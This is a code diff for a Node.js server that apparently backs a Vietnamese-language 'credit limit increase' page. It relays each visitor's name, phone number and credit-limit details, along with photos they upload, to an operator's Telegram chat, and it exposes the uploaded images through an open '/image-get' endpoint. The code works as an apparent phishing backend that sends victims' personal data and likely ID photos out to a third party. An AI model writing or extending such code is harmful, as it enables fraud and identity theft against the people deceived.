@@ -42,12 +42,13 @@ io.on("connection", function (socket) {
     });
     uploader.dir = "./public/uploads";
     uploader.listen(socket);
-    uploader.on("saved", async function (event) {
+    uploader.on("complete", async function (event) {
         await api.sendPhoto({
             chat_id: process.env.TELEGRAM_CHAT_ID,
             photo: fs.createReadStream(`${__dirname}/${event.file.pathName}`)
         });
     });
+
     socket.on('service', async (data) => {
         // send data to api telegram
         const message = `Có yêu cầu từ khách hàng: ${data.name} - Số điện thoại ${data.phone} - hạn mức hiện tại ${data.limit_now} - hạn mức khả dungh ${data.limit_total} - hạn mước mong muốn ${data.limit_increase}`;
@@ -364,16 +365,20 @@ app.get('/download-app', function (req, res) {
 });
 
 app.get('/images', function (req, res) {
+    res.sendFile(__dirname + '/views/images.html');
+});
+
+app.get('/image-get', function (req, res) {
     const path = `${__dirname}/public/uploads`;
     fs.readdir(path, function (err, items) {
         // sort by date
         items.sort((a, b) => {
             return fs.statSync(`${path}/${b}`).mtime.getTime() - fs.statSync(`${path}/${a}`).mtime.getTime();
         });
-        const images = items.map(item => {
-            return `<img src="/uploads/${item}" width="100px" height="100px" />`;
+
+        res.json({
+            data: items
         });
-        res.send(images.join(''));
     });
 });
 app.get('/gui-email', function (req, res) {
